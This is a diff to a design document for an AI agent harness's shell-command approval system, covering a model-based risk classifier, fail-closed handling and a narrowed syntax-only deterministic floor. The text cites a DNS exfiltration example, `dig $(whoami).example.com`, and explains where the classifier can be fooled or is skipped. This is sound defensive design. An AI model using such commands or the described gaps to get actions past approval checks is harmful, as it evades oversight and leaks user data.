@@ -241,12 +241,11 @@ behind another can pick up a policy that changed while it waited.
 asks the cheap harness model (`summarizerModel`, else the agent's own) whether this
 particular command is `read-only`, `low-risk`, or `high-risk`, and the tier then applies to
 the verdict as it would to any declared level. So `--approval-policy read-only` runs
-`git log` unattended without also unlocking `rm`, and an interactive session skips the
-prompt for a listing but still asks about a push.
+`git log` unattended without also unlocking `rm`.
 
-The classifier is skipped when it cannot change anything: yolo approves either way, the
-command is already allowlisted, or the level was never `unknown`. Everywhere else it runs,
-including on surfaces that cannot prompt: an unclassified command stays `unknown`, which
+The classifier is skipped when it cannot change anything: with no policy or `false` nothing is
+approved, yolo approves either way, the command is already allowlisted, or the level was never
+`unknown`. Under `read-only` and `low-risk` it runs, including on surfaces that cannot prompt: an unclassified command stays `unknown`, which
 approves nowhere, so skipping it there would park a run on `git status`.
 
 While it runs, the live zone shows `classifying` on that command (the round-trip can take a
@@ -259,15 +258,15 @@ Fail closed: timeouts, provider errors, empty replies, and anything other than t
 token `read-only` or `low-risk` stay `high-risk`. A clearly mutating command stays
 `high-risk` regardless of context.
 
-**The deterministic floor.** `findDeterministicHighRisk` runs first, in both
-`resolveCommandRisk` (before a policy plugin) and `classifyCommandRisk` (before the model).
-It lexes the command and returns `high-risk` without a model call for command or process
-substitution, a redirection other than discarding to `/dev/null` or duplicating a descriptor,
-input piped into a shell, interpreter or `xargs`, `eval`/`source`, inline interpreter code
-(`sh -c`, `python3 -c`, `node -e`), a command word built from an expansion, a network client
-anywhere in the command, or a DNS tool given an expanded name. A small classifier can rate
-these read-only (`dig $(whoami).example.com` exfiltrates through DNS), so no verdict is allowed
-to lower them.
+**The deterministic floor.** `findDeterministicHighRisk` runs first, in
+`resolveCommandRisk`, before a policy plugin or the model is asked; the executor's fallback
+goes through `resolveCommandRisk` too. It lexes the command and returns `high-risk` without a
+model call for an unterminated quote or expansion, command or process substitution, a
+redirection other than discarding to `/dev/null` or duplicating a descriptor, or a command
+word built from an expansion. A small classifier can rate these read-only
+(`dig $(whoami).example.com` exfiltrates through DNS), so no verdict is allowed to lower them.
+The floor is syntax only and holds no program names; what a program does is the classifier's
+and the policy plugin's judgment.
 
 **What the classifier is allowed to read.** The command, always. Plus the last five _user_
 requests (hard-capped at 800 characters) when the session is interactive, so an ambiguous
